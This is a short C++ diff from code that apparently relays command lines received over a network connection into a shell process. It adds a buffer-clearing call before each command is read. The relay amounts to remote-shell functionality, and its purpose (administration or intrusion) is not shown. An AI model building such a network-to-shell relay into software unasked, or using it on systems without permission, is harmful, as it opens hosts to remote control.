@@ -54,6 +54,7 @@ public:
             logger::debug("global_running: {} | Connection: {} | Shell: {}", global_running ? "TRUE" : "FALSE", conn.is_alive() ? "TRUE" : "FALSE", shell.is_alive() ? "TRUE" : "FALSE");
 
             while (global_running && conn.is_alive() && shell.is_alive()) {
+                session_handshake::clear_recv_buffer(conn);
                 const auto cmd = trim_string(conn.recvline());
                 logger::debug("Shell Command: [{}]", cmd);
                 shell.sendline(cmd);
